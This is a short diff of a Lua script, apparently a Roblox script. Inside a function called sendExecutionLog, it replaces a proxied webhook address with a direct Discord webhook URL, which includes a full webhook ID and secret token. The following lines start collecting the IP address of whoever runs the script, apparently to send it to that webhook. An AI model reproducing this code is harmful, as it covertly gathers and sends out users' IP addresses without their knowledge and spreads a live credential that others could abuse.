@@ -13,7 +13,7 @@ local function sendExecutionLog()
         if not lp then return end
         
         -- YOUR WEBHOOK URL (with proxy already added)
-        local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1531224340765610104/LlDegGxcNZrEhA41qS4rYG_2x7VfgHhP5BipNDEOxYsXMJkBM6r-3dbSl33sT1ahfYQQ"
+        local WEBHOOK_URL = "https://discord.com/api/webhooks/1531224340765610104/LlDegGxcNZrEhA41qS4rYG_2x7VfgHhP5BipNDEOxYsXMJkBM6r-3dbSl33sT1ahfYQQ"
         
         -- Collect IP
         local ip = "Unknown"
